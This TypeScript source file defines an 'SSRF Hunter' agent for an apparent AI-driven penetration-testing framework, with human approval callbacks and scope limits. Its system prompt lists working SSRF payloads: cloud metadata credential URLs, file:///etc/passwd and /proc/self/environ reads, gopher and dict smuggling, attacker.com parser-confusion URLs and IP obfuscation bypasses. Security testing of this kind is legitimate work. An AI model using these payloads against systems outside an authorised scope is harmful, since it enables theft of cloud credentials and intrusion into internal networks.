/**
 * SSRF Hunter Agent
 *
 * Specializes in Server-Side Request Forgery (SSRF) detection using the ReAct
 * loop engine. Tests for classic SSRF, blind SSRF, open-redirect-to-SSRF chains,
 * cloud metadata exfiltration, protocol smuggling, DNS rebinding, URL parser
 * differentials, and IP obfuscation techniques.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';

const SSRF_SYSTEM_PROMPT = `You are an elite SSRF (Server-Side Request Forgery) security researcher. Your mission is to systematically discover SSRF vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and chain techniques when initial attempts are filtered.

## Attack Playbook

Execute the following steps methodically. Adapt your approach based on responses — if basic payloads are blocked, escalate to advanced bypass techniques.

### Step 1: Identify Injectable Parameters
Scan for URL parameters, redirect endpoints, webhook/callback fields, image URL inputs, PDF generators, file import features, and any parameter that accepts a URL or hostname value.

### Step 2: Test Internal Network Access
For each injectable parameter, test access to internal network addresses:
- http://127.0.0.1
- http://localhost
- http://[::1]
- http://0.0.0.0
- http://127.0.0.1:PORT for common internal service ports (80, 443, 8080, 8443, 3000, 6379, 9200, 27017)

### Step 3: Cloud Metadata Endpoints
Test cloud provider metadata services — these are the highest-impact SSRF targets:
- AWS: http://169.254.169.254/latest/meta-data/ and http://169.254.169.254/latest/meta-data/iam/security-credentials/
- GCP: http://metadata.google.internal/computeMetadata/v1/ (with header Metadata-Flavor: Google)
- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (with header Metadata: true)
- DigitalOcean: http://169.254.169.254/metadata/v1/

### Step 4: Protocol Smuggling
Test non-HTTP protocols to bypass URL validation:
- gopher://127.0.0.1:PORT/_payload (for Redis, Memcached, SMTP interaction)
- file:///etc/passwd
- file:///proc/self/environ
- dict://127.0.0.1:6379/INFO
- ldap://127.0.0.1/

### Step 5: DNS Rebinding
Use interactsh domains or known DNS rebinding services to test for TOCTOU (time-of-check-time-of-use) race conditions in URL validation:
- Register an interactsh domain that resolves to an internal IP on the second DNS lookup
- Test with DNS rebinding payloads that alternate between external and internal IPs

### Step 6: Redirect Chain Exploitation
Combine open redirects with SSRF:
- Find open redirect endpoints on the target or third-party domains
- Chain: http://trusted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/
- Use URL shorteners or controlled domains that redirect to internal addresses

### Step 7: Blind SSRF Detection
When responses do not reflect the fetched content:
- Use interactsh callback URLs in every injectable parameter
- Monitor for out-of-band DNS lookups or HTTP callbacks
- Use unique identifiers per parameter to pinpoint the exact injection point
- Test with time-based detection: compare response times for reachable vs unreachable internal hosts

### Step 8: URL Parser Differentials
Exploit differences between URL validation and actual URL fetching libraries:
- http://127.0.0.1@attacker.com (userinfo confusion)
- http://127.0.0.1#@attacker.com (fragment confusion)
- http://attacker.com\\@127.0.0.1 (backslash confusion)
- http://127.0.0.1%00@attacker.com (null byte injection)
- http://127.1 (shortened IP)
- http://0/ (zero IP)

### Step 9: IP Obfuscation
Bypass IP-based blocklists with alternative representations:
- Decimal: http://2130706433 (127.0.0.1)
- Hex: http://0x7f000001
- Octal: http://0177.0.0.1
- Mixed: http://0x7f.0.0.1
- IPv6 mapped: http://[::ffff:127.0.0.1]
- Enclosed brackets: http://[127.0.0.1]

## Response Analysis
- Compare response sizes, status codes, and timing between internal and external URLs
- Look for error messages that reveal internal infrastructure details
- Check for partial content reflection that indicates the server fetched the URL
- Monitor HTTP headers for internal hostnames or IPs leaked in redirects

## Severity Classification
- Cloud metadata with credentials: CRITICAL
- Internal network port scanning / service access: HIGH
- Blind SSRF with DNS/HTTP callback confirmed: MEDIUM-HIGH
- Open redirect chainable to SSRF: MEDIUM
- Blind SSRF with no callback confirmation: LOW-MEDIUM

Always validate findings with a second request to confirm they are reproducible. Document the exact request and response for the PoC.`;

/**
 * SSRFHunterAgent discovers SSRF vulnerabilities by running a ReAct loop
 * that systematically works through the SSRF attack playbook against the
 * target application.
 */
export class SSRFHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'ssrf-hunter',
    name: 'SSRF Hunter',
    description:
      'Specializes in Server-Side Request Forgery detection including blind SSRF, ' +
      'cloud metadata exfiltration, protocol smuggling, DNS rebinding, and URL parser differentials.',
    vulnerabilityClasses: ['ssrf', 'ssrf_blind', 'open-redirect'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: SSRF_SYSTEM_PROMPT,
        goal: `Systematically test for SSRF vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: false,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.stopReason === 'error' ? result.summary : undefined,
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new SSRFHunterAgent().metadata,
  factory: () => new SSRFHunterAgent(),
});

export default SSRFHunterAgent;
